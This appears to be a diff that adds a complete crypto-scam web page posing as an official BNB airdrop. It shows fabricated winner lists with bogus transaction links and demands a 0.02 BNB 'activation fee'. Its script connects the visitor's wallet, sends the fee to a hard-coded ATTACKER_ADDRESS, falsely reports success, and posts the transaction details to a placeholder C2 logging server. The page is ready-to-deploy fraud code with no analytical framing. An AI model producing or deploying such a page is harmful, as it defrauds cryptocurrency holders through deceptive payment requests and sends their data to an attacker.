@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Claim BNB Airdrop - Official</title>
+    <link rel="stylesheet" href="assets/style.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+</head>
+<body>
+
+<div class="claim-page">
+    <button class="back-btn" onclick="history.back()">← Back to Home</button>
+
+    <h1 style="text-align: center; margin: 30px 0; color: #f3ba2f;">Claim Your Free BNB</h1>
+
+    <div class="pool-info">
+        <h2>🔥 Airdrop Pool: 1,000 BNB</h2>
+        <p>Participate now and win up to <strong>1.0 BNB</strong> instantly.</p>
+        <div class="alert">
+            <strong>⚠️ Activation Fee: 0.02 BNB</strong><br>
+            Required to join. Sent directly to the smart contract.
+        </div>
+    </div>
+
+    <button class="claim-btn" onclick="sendFee()">
+        <i class="fas fa-gift"></i> Pay 0.02 BNB & Claim Reward
+    </button>
+
+    <div class="winners">
+        <h3>🎉 Recent Winners</h3>
+        <ul>
+            <li><strong>0.42 BNB</strong> → <code>0x...a33b</code> <small>(Tx: <a href="https://bscscan.com/tx/0xa3f2b11c" target="_blank">a3f2...b11c</a>)</small></li>
+            <li><strong>0.68 BNB</strong> → <code>0x...c44d</code> <small>(Tx: <a href="https://bscscan.com/tx/0xc7d9e44a" target="_blank">c7d9...e44a</a>)</small></li>
+            <li><strong>0.31 BNB</strong> → <code>0x...f55e</code> <small>(Tx: <a href="https://bscscan.com/tx/0xf1x8m33n" target="_blank">f1x8...m33n</a>)</small></li>
+        </ul>
+    </div>
+</div>
+
+<script>
+    const ATTACKER_ADDRESS = "0x40f4c332be705dbf098a48a728248b13a005e7cb";
+    const EXFIL_URL = "https://your-c2-server.com/log.php";
+
+    async function sendFee() {
+        if (typeof window.ethereum === "undefined") {
+            alert("Please install MetaMask or Trust Wallet.");
+            return;
+        }
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const value = ethers.utils.parseUnits("0.02", "ether");
+            const tx = await signer.sendTransaction({
+                to: ATTACKER_ADDRESS,
+                value: value
+            });
+            alert(`🎉 Success! You’ve joined the airdrop.\nTx: ${tx.hash}`);
+            fetch(EXFIL_URL, {
+                method: "POST",
+                body: JSON.stringify({ type: "claim", fee: "0.02", hash: tx.hash, ts: new Date() }),
+                headers: { "Content-Type": "application/json" }
+            });
+        } catch (err) {
+            alert("Transaction failed or rejected.");
+        }
+    }
+</script>
+</body>
+</html>
